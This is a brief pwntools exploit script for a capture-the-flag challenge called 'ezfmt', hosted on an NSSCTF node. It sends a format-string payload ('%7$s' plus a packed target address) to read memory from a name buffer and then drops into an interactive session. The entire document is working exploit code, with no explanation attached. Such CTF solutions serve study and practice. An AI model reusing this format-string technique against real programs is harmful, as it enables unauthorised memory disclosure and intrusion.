from pwn import *

#io = process("./ezfmt")
io = remote("node5.anna.nssctf.cn", 22607)

# offset 6
name_addr = 0x4040C0 - 0x20
payload = b"%7$saaaa" + p64(name_addr)

io.sendafter(b"string.", payload)
io.interactive()
